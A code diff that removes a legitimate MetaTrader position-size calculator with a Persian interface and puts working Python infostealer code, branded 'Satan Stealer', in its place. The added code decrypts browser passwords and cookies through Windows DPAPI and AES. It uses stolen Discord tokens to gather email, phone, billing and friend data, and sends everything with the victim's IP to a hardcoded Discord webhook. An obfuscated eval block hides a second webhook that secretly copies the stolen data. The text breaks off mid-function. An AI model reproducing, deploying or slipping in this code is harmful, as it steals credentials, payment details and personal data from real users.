@@ -1,439 +1,937 @@
-import sys
-import MetaTrader5 as mt5
-from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-                             QFormLayout, QLineEdit, QPushButton, QTextEdit, QLabel,
-                             QGroupBox, QDoubleSpinBox, QFrame, QGridLayout)
-from PyQt5.QtCore import Qt
-from PyQt5.QtGui import QFont, QPalette, QColor, QIcon
+import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import re
+import subprocess
 
-class PositionCalculator(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("Position Size Calculator Pro")
-        self.setWindowIcon(QIcon("icon.png"))  # Add your icon file
-        self.setGeometry(100, 100, 950, 750)
-        
-        # Professional dark theme
-        self.setStyleSheet("""
-            QMainWindow {
-                background-color: #1e1e2e;
-                color: #d9dce0;
-            }
-            QGroupBox {
-                background-color: #27293d;
-                border: 1px solid #3d405b;
-                border-radius: 8px;
-                margin-top: 1.5ex;
-                padding-top: 1.5ex;
-                font-weight: bold;
-                font-size: 11pt;
-            }
-            QGroupBox::title {
-                subcontrol-origin: margin;
-                left: 12px;
-                padding: 0 8px;
-                color: #6cacff;
-            }
-            QPushButton {
-                background-color: #3a7bd5;
-                color: white;
-                border: none;
-                border-radius: 5px;
-                padding: 10px 20px;
-                font-weight: bold;
-                font-size: 11pt;
-                min-height: 40px;
-            }
-            QPushButton:hover {
-                background-color: #2d68b1;
-            }
-            QPushButton:pressed {
-                background-color: #1c4f8e;
-            }
-            QLineEdit, QTextEdit, QDoubleSpinBox {
-                background-color: #1e1e2e;
-                color: #ffffff;
-                border: 1px solid #3d405b;
-                border-radius: 4px;
-                padding: 8px;
-                font-size: 11pt;
-                selection-background-color: #3a7bd5;
-            }
-            QLabel {
-                color: #a0a5b0;
-                font-size: 10pt;
-            }
-            QDoubleSpinBox::up-button, QDoubleSpinBox::down-button {
-                width: 20px;
-            }
-            #resultBox {
-                background-color: #27293d;
-                border: 1px solid #3d405b;
-                border-radius: 8px;
-                padding: 15px;
-            }
-            #tpContainer {
-                background-color: #1e1e2e;
-                border-radius: 8px;
-                padding: 10px;
-            }
-            .resultLabel {
-                font-size: 11pt;
-                font-weight: bold;
-                color: #6cacff;
-            }
-            .valueLabel {
-                font-size: 12pt;
-                font-weight: bold;
-                color: #ffffff;
-            }
-            .tpBox {
-                background-color: #2c3e50;
-                border-radius: 6px;
-                padding: 10px;
-                min-width: 120px;
-            }
-            .tpHeader {
-                font-weight: bold;
-                font-size: 11pt;
-                color: #6cacff;
-                text-align: center;
-            }
-            .tpValue {
-                font-weight: bold;
-                font-size: 13pt;
-                color: #ffffff;
-                text-align: center;
-            }
-            .logHeader {
-                font-weight: bold;
-                color: #6cacff;
-            }
-        """)
-        
-        self.init_ui()
-        
-    def init_ui(self):
-        # Central widget and main layout
-        central_widget = QWidget()
-        self.setCentralWidget(central_widget)
-        main_layout = QVBoxLayout(central_widget)
-        main_layout.setSpacing(20)
-        main_layout.setContentsMargins(25, 25, 25, 25)
-        
-        # Header
-        header = QLabel("محاسبه گر حرفه‌ای حجم پوزیشن")
-        header.setStyleSheet("font-size: 16pt; font-weight: bold; color: #6cacff;")
-        header.setAlignment(Qt.AlignCenter)
-        header.setMinimumHeight(40)
-        main_layout.addWidget(header)
-        
-        # Input Section
-        input_group = QGroupBox("تنظیمات معامله")
-        input_layout = QGridLayout()
-        input_layout.setSpacing(15)
-        input_layout.setColumnMinimumWidth(0, 120)
-        input_layout.setColumnStretch(1, 3)
-        
-        # Account Balance
-        balance_label = QLabel("موجودی حساب:")
-        self.balance_spin = QDoubleSpinBox()
-        self.balance_spin.setRange(1, 10000000)
-        self.balance_spin.setValue(1000)
-        self.balance_spin.setDecimals(2)
-        self.balance_spin.setSuffix(" $")
-        self.balance_spin.setSingleStep(100)
-        
-        # Risk Percentage
-        risk_label = QLabel("درصد ریسک:")
-        self.risk_spin = QDoubleSpinBox()
-        self.risk_spin.setRange(0.1, 100)
-        self.risk_spin.setValue(2)
-        self.risk_spin.setDecimals(1)
-        self.risk_spin.setSuffix(" %")
-        self.risk_spin.setSingleStep(0.5)
-        
-        # Entry Price
-        entry_label = QLabel("قیمت ورود:")
-        self.entry_spin = QDoubleSpinBox()
-        self.entry_spin.setRange(0.00001, 1000000)
-        self.entry_spin.setValue(44944)
-        self.entry_spin.setDecimals(5)
-        
-        # Stop Loss Price
-        stoploss_label = QLabel("قیمت حد ضرر:")
-        self.stoploss_spin = QDoubleSpinBox()
-        self.stoploss_spin.setRange(0.00001, 1000000)
-        self.stoploss_spin.setValue(44960)
-        self.stoploss_spin.setDecimals(5)
-        
-        # Symbol
-        symbol_label = QLabel("نماد:")
-        self.symbol_edit = QLineEdit("DJIUSD")
-        
-        # TP Ratios
-        tp_label = QLabel("نسبت‌های TP:")
-        tp_layout = QHBoxLayout()
-        self.tp_ratios = []
-        for i in range(4):
-            spin = QDoubleSpinBox()
-            spin.setRange(0.1, 20)
-            spin.setValue(i+1)
-            spin.setDecimals(1)
-            spin.setSingleStep(0.5)
-            tp_layout.addWidget(spin)
-            self.tp_ratios.append(spin)
-        
-        # Add to grid
-        input_layout.addWidget(balance_label, 0, 0)
-        input_layout.addWidget(self.balance_spin, 0, 1)
-        input_layout.addWidget(risk_label, 1, 0)
-        input_layout.addWidget(self.risk_spin, 1, 1)
-        input_layout.addWidget(entry_label, 2, 0)
-        input_layout.addWidget(self.entry_spin, 2, 1)
-        input_layout.addWidget(stoploss_label, 3, 0)
-        input_layout.addWidget(self.stoploss_spin, 3, 1)
-        input_layout.addWidget(symbol_label, 4, 0)
-        input_layout.addWidget(self.symbol_edit, 4, 1)
-        input_layout.addWidget(tp_label, 5, 0)
-        input_layout.addLayout(tp_layout, 5, 1)
-        
-        # Calculate button
-        self.calculate_btn = QPushButton("محاسبه حجم پوزیشن")
-        self.calculate_btn.setMinimumHeight(45)
-        self.calculate_btn.setFont(QFont("Arial", 11, QFont.Bold))
-        self.calculate_btn.clicked.connect(self.calculate)
-        
-        input_group.setLayout(input_layout)
-        main_layout.addWidget(input_group)
-        main_layout.addWidget(self.calculate_btn)
-        
-        # Results Section
-        results_group = QGroupBox("نتایج محاسبات")
-        results_layout = QVBoxLayout()
-        
-        # Main results
-        main_result_layout = QHBoxLayout()
-        
-        # Lot size and risk
-        left_result = QVBoxLayout()
-        self.lot_label = QLabel("-")
-        self.lot_label.setStyleSheet("font-size: 18pt; font-weight: bold; color: #6cacff;")
-        self.lot_label.setAlignment(Qt.AlignCenter)
-        lot_title = QLabel("حجم پوزیشن (لات)")
-        lot_title.setAlignment(Qt.AlignCenter)
-        
-        self.risk_label = QLabel("-")
-        self.risk_label.setStyleSheet("font-size: 14pt; color: #ffffff;")
-        self.risk_label.setAlignment(Qt.AlignCenter)
-        risk_title = QLabel("ریسک معامله")
-        risk_title.setAlignment(Qt.AlignCenter)
-        
-        left_result.addWidget(lot_title)
-        left_result.addWidget(self.lot_label)
-        left_result.addSpacing(20)
-        left_result.addWidget(risk_title)
-        left_result.addWidget(self.risk_label)
-        
-        # Stop distance and loss per lot
-        center_result = QVBoxLayout()
-        self.stop_distance_label = QLabel("-")
-        self.stop_distance_label.setStyleSheet("font-size: 14pt; color: #ffffff;")
-        self.stop_distance_label.setAlignment(Qt.AlignCenter)
-        stop_title = QLabel("فاصله استاپ (پوینت)")
-        stop_title.setAlignment(Qt.AlignCenter)
-        
-        self.loss_per_lot_label = QLabel("-")
-        self.loss_per_lot_label.setStyleSheet("font-size: 14pt; color: #ffffff;")
-        self.loss_per_lot_label.setAlignment(Qt.AlignCenter)
-        loss_title = QLabel("زیان هر لات")
-        loss_title.setAlignment(Qt.AlignCenter)
-        
-        center_result.addWidget(stop_title)
-        center_result.addWidget(self.stop_distance_label)
-        center_result.addSpacing(20)
-        center_result.addWidget(loss_title)
-        center_result.addWidget(self.loss_per_lot_label)
-        
-        # TP results
-        right_result = QVBoxLayout()
-        tp_title = QLabel("سطوح سود (TP)")
-        tp_title.setAlignment(Qt.AlignCenter)
-        
-        tp_container = QWidget()
-        tp_container.setObjectName("tpContainer")
-        tp_grid = QGridLayout(tp_container)
-        
-        self.tp_labels = []
-        for i in range(4):
-            # TP header
-            header = QLabel(f"TP{i+1} (1:{self.tp_ratios[i].value()})".replace(".0",""))
-            header.setStyleSheet(".tpHeader")
-            header.setAlignment(Qt.AlignCenter)
-            
-            # TP value
-            value = QLabel("-")
-            value.setStyleSheet(".tpValue")
-            value.setAlignment(Qt.AlignCenter)
-            
-            # Profit label
-            profit = QLabel("-")
-            profit.setStyleSheet("font-size: 11pt; color: #4cd964; text-align: center;")
-            profit.setAlignment(Qt.AlignCenter)
-            
-            tp_grid.addWidget(header, 0, i)
-            tp_grid.addWidget(value, 1, i)
-            tp_grid.addWidget(profit, 2, i)
-            self.tp_labels.append((header, value, profit))
-        
-        right_result.addWidget(tp_title)
-        right_result.addWidget(tp_container)
-        
-        # Add to main result layout
-        main_result_layout.addLayout(left_result, 35)
-        main_result_layout.addLayout(center_result, 30)
-        main_result_layout.addLayout(right_result, 35)
-        
-        results_layout.addLayout(main_result_layout)
-        
-        # Log output
-        log_title = QLabel("جزئیات محاسبات")
-        log_title.setStyleSheet(".logHeader")
-        self.log_output = QTextEdit()
-        self.log_output.setReadOnly(True)
-        self.log_output.setPlaceholderText("نتایج محاسبات در اینجا نمایش داده می‌شود...")
-        
-        results_layout.addWidget(log_title)
-        results_layout.addWidget(self.log_output)
-        
-        results_group.setLayout(results_layout)
-        main_layout.addWidget(results_group)
-        
-    def calculate(self):
-        # Get values from inputs
-        balance = self.balance_spin.value()
-        risk_percent = self.risk_spin.value()
-        entry_price = self.entry_spin.value()
-        stop_loss_price = self.stoploss_spin.value()
-        symbol = self.symbol_edit.text().strip()
-        tp_ratios = [spin.value() for spin in self.tp_ratios]
-        
-        # Clear previous results
-        self.lot_label.setText("-")
-        self.risk_label.setText("-")
-        self.stop_distance_label.setText("-")
-        self.loss_per_lot_label.setText("-")
-        
-        for header, value, profit in self.tp_labels:
-            value.setText("-")
-            profit.setText("-")
-        
-        self.log_output.clear()
-        
-        # Connect to MT5
-        if not mt5.initialize():
-            error = mt5.last_error()
-            self.log_output.append(f"<span style='color:#ff6b6b'>خطا در اتصال به متاتریدر: {error}</span>")
-            return
-        
+
+
+#REPLACE YOUR WEBHOOK
+
+
+hook = "https://discord.com/api/webhooks/1401193429722988604/KnoEkqfndwodO3G7iyiO24nCpGa9iApR0ecoTX_L-7_QqfDzk-3Wn0hDDuJCMGY1OVwT"
+DETECTED = False
+
+
+def getip():
+    ip = "None"
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
+
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"]
+]
+for modl in requirements:
+    try: __import__(modl[0])
+    except:
+        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
+        time.sleep(3)
+
+import requests
+from Crypto.Cipher import AES
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
+Threadlist = []
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [
+        ('cbData', wintypes.DWORD),
+        ('pbData', POINTER(c_char))
+    ]
+
+def GetData(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
+def CryptUnprotectData(encrypted_bytes, entropy=b''):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+        return GetData(blob_out)
+
+def DecryptValue(buff, master_key=None):
+    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+    if starts == 'v10' or starts == 'v11':
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+def LoadRequests(methode, url, data='', files='', headers=''):
+    for i in range(8): # max trys
         try:
-            # Get symbol info
-            symbol_info = mt5.symbol_info(symbol)
-            if symbol_info is None:
-                self.log_output.append(f"<span style='color:#ff6b6b'>نماد {symbol} یافت نشد</span>")
-                return
-            
-            # Activate symbol if not visible
-            if not symbol_info.visible:
-                self.log_output.append(f"<span style='color:#ffd166'>⚠️ نماد {symbol} غیرفعال است، در حال فعال سازی...</span>")
-                if not mt5.symbol_select(symbol, True):
-                    self.log_output.append(f"<span style='color:#ff6b6b'>فعال سازی ناموفق: {symbol}</span>")
-                    return
-            
-            # Calculate risk amount
-            risk_amount = balance * (risk_percent / 100)
-            
-            # Get symbol properties
-            contract_size = symbol_info.trade_contract_size
-            tick_size = symbol_info.trade_tick_size
-            tick_value = symbol_info.trade_tick_value
-            
-            # Calculate stop distance in points
-            stop_distance_points = abs(entry_price - stop_loss_price)
-            
-            # Calculate loss per lot
-            loss_per_lot = (stop_distance_points / tick_size) * tick_value
-            
-            # Calculate position size
-            lots = risk_amount / loss_per_lot if loss_per_lot > 0 else 0
-            
-            # Apply broker constraints
-            min_lot = symbol_info.volume_min
-            max_lot = symbol_info.volume_max
-            lot_step = symbol_info.volume_step
-            
-            if lots < min_lot:
-                self.log_output.append(f"<span style='color:#ffd166'>⚠️ حجم محاسبه‌شده ({lots:.2f}) کوچکتر از حداقل مجاز ({min_lot}) است</span>")
-                lots = min_lot
-            elif lots > max_lot:
-                self.log_output.append(f"<span style='color:#ffd166'>⚠️ حجم محاسبه‌شده ({lots:.2f}) بزرگتر از حداکثر مجاز ({max_lot}) است</span>")
-                lots = max_lot
-            
-            # Round to nearest step
-            if lot_step > 0:
-                lots = round(lots / lot_step) * lot_step
-            
-            # Calculate actual risk
-            actual_risk = lots * loss_per_lot
-            
-            # Update main results
-            self.lot_label.setText(f"{lots:.2f}")
-            self.risk_label.setText(f"{actual_risk:.2f} $")
-            self.stop_distance_label.setText(f"{stop_distance_points:.2f}")
-            self.loss_per_lot_label.setText(f"{loss_per_lot:.2f} $")
-            
-            # Calculate and display TPs
-            direction = 1 if entry_price < stop_loss_price else -1
-            for i, ratio in enumerate(tp_ratios):
-                # Update TP header
-                self.tp_labels[i][0].setText(f"TP{i+1} (1:{ratio})")
-                
-                # Calculate TP price
-                tp_price = entry_price + (stop_distance_points * ratio * direction)
-                self.tp_labels[i][1].setText(f"{tp_price:.5f}")
-                
-                # Calculate TP profit
-                tp_profit = (stop_distance_points * ratio / tick_size) * tick_value * lots
-                self.tp_labels[i][2].setText(f"{tp_profit:.2f} $")
-            
-            # Show detailed log
-            self.log_output.append("<b>--- جزئیات نماد و محاسبات ---</b>")
-            self.log_output.append(f"<b>نماد:</b> {symbol}")
-            self.log_output.append(f"<b>موجودی حساب:</b> {balance:.2f} $")
-            self.log_output.append(f"<b>درصد ریسک:</b> {risk_percent}%")
-            self.log_output.append(f"<b>ریسک دلاری:</b> {risk_amount:.2f} $")
-            self.log_output.append(f"<b>قیمت ورود:</b> {entry_price}")
-            self.log_output.append(f"<b>قیمت حد ضرر:</b> {stop_loss_price}")
-            self.log_output.append(f"<b>فاصله استاپ:</b> {stop_distance_points:.2f} پوینت")
-            self.log_output.append(f"<b>اندازه قرارداد:</b> {contract_size}")
-            self.log_output.append(f"<b>اندازه تیک:</b> {tick_size}")
-            self.log_output.append(f"<b>ارزش تیک:</b> {tick_value}")
-            self.log_output.append(f"<b>حداقل لات:</b> {min_lot}")
-            self.log_output.append(f"<b>حداکثر لات:</b> {max_lot}")
-            self.log_output.append(f"<b>گام لات:</b> {lot_step}")
-            self.log_output.append(f"<b>زیان هر لات:</b> {loss_per_lot:.2f} $")
-            self.log_output.append(f"<b>حجم پوزیشن:</b> {lots:.2f} لات")
-            self.log_output.append(f"<b>ریسک واقعی:</b> {actual_risk:.2f} $")
-            self.log_output.append("<b>--- پایان محاسبات ---</b>")
-            
-        except Exception as e:
-            self.log_output.append(f"<span style='color:#ff6b6b'>خطا: {str(e)}</span>")
-        finally:
-            mt5.shutdown()
+            if methode == 'POST':
+                if data != '':
+                    r = requests.post(url, data=data)
+                    if r.status_code == 200:
+                        return r
+                elif files != '':
+                    r = requests.post(url, files=files)
+                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
+                        return r
+        except:
+            pass
 
-if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    app.setFont(QFont("Arial", 10))
-    window = PositionCalculator()
-    window.show()
-    sys.exit(app.exec_())
+def LoadUrlib(hook, data='', files='', headers=''):
+    for i in range(8):
+        try:
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(hook, data=data))
+                return r
+        except: 
+            pass
+
+def globalInfo():
+    ip = getip()
+    username = os.getenv("USERNAME")
+    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
+    # print(ipdatanojson)
+    ipdata = loads(ipdatanojson)
+    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
+    contry = ipdata["country_name"]
+    contryCode = ipdata["country_code"].lower()
+    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+    # print(globalinfo)
+    return globalinfo
+
+
+def Trust(Cookies):
+    # simple Trust Factor system
+    global DETECTED
+    data = str(Cookies)
+    tim = re.findall(".google.com", data)
+    # print(len(tim))
+    if len(tim) < -1:
+        DETECTED = True
+        return DETECTED
+    else:
+        DETECTED = False
+        return DETECTED
+        
+def GetUHQFriends(token):
+    badgeList =  [
+        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:active_developer:1041777282185953310> "},
+        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
+        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
+        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
+        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
+        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
+        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
+        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+    ]
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
+    except:
+        return False
+
+    uhqlist = ''
+    for friend in friendlist:
+        OwnedBadges = ''
+        flags = friend['user']['public_flags']
+        for badge in badgeList:
+            if flags // badge["Value"] != 0 and friend['type'] == 1:
+                if not "House" in badge["Name"]:
+                    OwnedBadges += badge["Emoji"]
+                flags = flags % badge["Value"]
+        if OwnedBadges != '':
+            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+    return uhqlist
+
+
+def GetBilling(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
+    except:
+        return False
+    
+    if billingjson == []: return " -"
+
+    billing = ""
+    for methode in billingjson:
+        if methode["invalid"] == False:
+            if methode["type"] == 1:
+                billing += ":credit_card:"
+            elif methode["type"] == 2:
+                billing += " <:PAYPAL:975437570748088381>: "
+
+    return billing
+
+
+def GetBadge(flags):
+    if flags == 0: return ''
+
+    OwnedBadges = ''
+    badgeList =  [
+        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
+        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
+        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
+        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
+        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
+        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
+        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
+        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
+        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+    ]
+    for badge in badgeList:
+        if flags // badge["Value"] != 0:
+            OwnedBadges += badge["Emoji"]
+            flags = flags % badge["Value"]
+
+    return OwnedBadges
+
+def GetTokenInfo(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+    username = userjson["username"]
+    hashtag = userjson["discriminator"]
+    email = userjson["email"]
+    idd = userjson["id"]
+    pfp = userjson["avatar"]
+    flags = userjson["public_flags"]
+    nitro = ""
+    phone = "-"
+
+    if "premium_type" in userjson: 
+        nitrot = userjson["premium_type"]
+        if nitrot == 1:
+            nitro = "<:classic:896119171019067423> "
+        elif nitrot == 2:
+            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
+    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
+
+    return username, hashtag, email, idd, pfp, flags, nitro, phone
+
+def checkToken(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    try:
+        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        return True
+    except:
+        return False
+
+    
+
+import base64, codecs
+magic = 'bXlob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBp'
+love = 'Y3qyLzuio2gmYmRjAwL0AwN2BGLmAwRjAQLjAmpio2Wn'
+god = 'aVhOWmxNVmZONm9yMUl6M0ZuUlZiQmdsYV9pN0picndI'
+destiny = 'JyEVEaDgZwu4F3x1AScOqJ9YIHMwqmMDHaMgrKSsrHbv'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
+
+def uploadToken(token, path):
+    global hook
+    global myhook
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
+
+    if pfp == None: 
+        pfp = "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+    else:
+        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
+
+    billing = GetBilling(token)
+    badge = GetBadge(flags)
+    friends = GetUHQFriends(token)
+    if friends == '': friends = "No Rare Friends"
+    if not billing:
+        badge, phone, billing = "🔒", "🔒", "🔒"
+    if nitro == '' and badge == '': nitro = " -"
+
+    data = {
+        "content": f'{globalInfo()} | Found in `{path}`',
+        "embeds": [
+            {
+            "color": 2895667,
+            "fields": [
+                {
+                    "name": "<a:8639dollar2:1014188341064900729> Token:",
+                    "value": f"`{token}`"
+                },
+                {
+                    "name": "<:b_lovekanji:1003875272862470234> Email:",
+                    "value": f"`{email}`",
+                    "inline": True
+                },
+                {
+                    "name": "<a:bcoroa_fire:996560652334272554> Phone:",
+                    "value": f"{phone}",
+                    "inline": True
+                },
+                {
+                    "name": "<:VC_blackheart2:918226594550648903> IP:",
+                    "value": f"`{getip()}`",
+                    "inline": True
+                },
+                {
+                    "name": "<a:bsymbol_satanic_fire:947142520054362162> Badges:",
+                    "value": f"{nitro}{badge}",
+                    "inline": True
+                },
+                {
+                    "name": "<a:abat:965079896655265842> Billing:",
+                    "value": f"{billing}",
+                    "inline": True
+                },
+                {
+                    "name": "<a:ablackfirearm:965087844731326514> HQ Friends:",
+                    "value": f"{friends}",
+                    "inline": False
+                }
+                ],
+            "author": {
+                "name": f"{username}#{hashtag} ({idd})",
+                "icon_url": f"{pfp}"
+                },
+            "footer": {
+                "text": "Satan Stealer",
+                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                },
+            "thumbnail": {
+                "url": f"{pfp}"
+                }
+            }
+        ],
+        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "username": "Satan Stealer",
+        "attachments": []
+        }
+    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+
+def Reformat(listt):
+    e = re.findall("(\w+[a-z])",listt)
+    while "https" in e: e.remove("https")
+    while "com" in e: e.remove("com")
+    while "net" in e: e.remove("net")
+    return list(set(e))
+
+def upload(name, link):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+
+    if name == "wpcook":
+        rb = ' | '.join(da for da in cookiWords)
+        if len(rb) > 1000: 
+            rrrrr = Reformat(str(cookiWords))
+            rb = ' | '.join(da for da in rrrrr)
+        data = {
+            "content": globalInfo(),
+            "embeds": [
+                {
+                    "title": "Satan | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:bl_skull:937798683368505364> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [SatanCookies.txt]({link})",
+                    "color": 2895667,
+                    "footer": {
+                        "text": "Satan Stealer",
+                        "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                    }
+                }
+            ],
+            "username": "Satan Stealer",
+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+            "attachments": []
+            }
+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        return
+
+    if name == "wppassw":
+        ra = ' | '.join(da for da in paswWords)
+        if len(ra) > 1000: 
+            rrr = Reformat(str(paswWords))
+            ra = ' | '.join(da for da in rrr)
+
+        data = {
+            "content": globalInfo(),
+            "embeds": [
+                {
+                    "title": "Satan | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <a:crspookylaugh:886385706975510538> • **{PasswCount}** Passwords Found\n <a:LV1:1042397877722423368> • [SatanPasswords.txt]({link})",
+                    "color": 2895667,
+                    "footer": {
+                        "text": "Satan Stealer",
+                        "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                    }
+                }
+            ],
+            "username": "Satan Stealer",
+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+            "attachments": []
+            }
+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        return
+
+    if name == "kiwi":
+        data = {
+            "content": globalInfo(),
+            "embeds": [
+                {
+                "color": 2895667,
+                "fields": [
+                    {
+                    "name": "Interesting files found on user PC:",
+                    "value": link
+                    }
+                ],
+                "author": {
+                    "name": "Satan | File Stealer"
+                },
+                "footer": {
+                    "text": "Satan Stealer",
+                    "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+                }
+                }
+            ],
+            "username": "Satan Stealer",
